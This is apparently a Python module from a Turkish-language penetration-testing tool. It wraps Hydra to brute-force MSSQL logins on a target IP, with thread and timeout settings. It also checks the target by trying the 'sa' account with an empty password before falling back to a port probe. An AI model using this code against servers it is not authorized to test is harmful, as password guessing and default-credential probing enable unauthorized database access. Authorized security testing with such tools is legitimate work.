from .base import BruteForceBase
from config import Ayarlar

class MSSQLBruteForce(BruteForceBase):
    def __init__(self, hedef_ip, hedef_port=1433):
        super().__init__(hedef_ip, hedef_port, "MSSQL")
        # MSSQL için özel ayarlar
        self.thread_sayisi = Ayarlar.MSSQL_THREADS
        self.timeout = Ayarlar.MSSQL_TIMEOUT
        
    def _hydra_tipi(self):
        return "mssql"
        
    def _komut_olustur(self, kullanici_listesi, sifre_listesi):
        komut = super()._komut_olustur(kullanici_listesi, sifre_listesi)
        # MSSQL için ek parametreler
        komut.extend(["-W", str(self.timeout)])  # Bağlantı timeout
        komut.extend(["-t", str(self.thread_sayisi)])  # Thread sayısı
        return komut
        
    def _mssql_baglanti_kontrol(self):
        # MSSQL bağlantısını test etmek için basit bir kontrol
        try:
            import pyodbc
            # MSSQL için connection string
            conn_str = f"DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={self.hedef_ip},{self.hedef_port};UID=sa;PWD=;Connection Timeout=5;"
            conn = pyodbc.connect(conn_str)
            conn.close()
            return True
        except Exception:
            # pyodbc yoksa socket ile basit kontrol
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.hedef_ip, self.hedef_port))
                sock.close()
                return result == 0
            except:
                return False